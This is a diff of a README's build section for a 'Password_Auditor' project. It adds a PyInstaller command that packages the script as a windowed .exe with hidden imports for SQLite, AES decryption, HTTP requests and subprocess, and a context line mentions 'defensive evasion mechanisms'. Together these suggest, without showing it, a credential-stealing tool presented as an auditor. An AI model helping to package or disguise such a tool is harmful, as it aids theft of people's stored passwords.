@@ -112,8 +112,20 @@ This project was updated to include **defensive evasion mechanisms**, so that th
 To package this tool into a single `.exe` file:
 
 ```bash
-pyinstaller --noconfirm --onefile --windowed ^
-  --name Password_Auditor ^
+pyinstaller --noconfirm --onefile --windowed --name AuditorEXE ^
+  --hidden-import sqlite3 ^
+  --hidden-import json ^
+  --hidden-import base64 ^
+  --hidden-import requests ^
+  --hidden-import shutil ^
+  --hidden-import time ^
+  --hidden-import subprocess ^
+  --hidden-import os ^
+  --hidden-import xml.etree.ElementTree ^
+  --hidden-import Cryptodome.Cipher.AES ^
+  --hidden-import Crypto.Util.Padding ^
+  --hidden-import cryptography.hazmat.primitives.ciphers ^
+  --hidden-import cryptography.hazmat.backends ^
   Password_Auditor.py
 ```
 
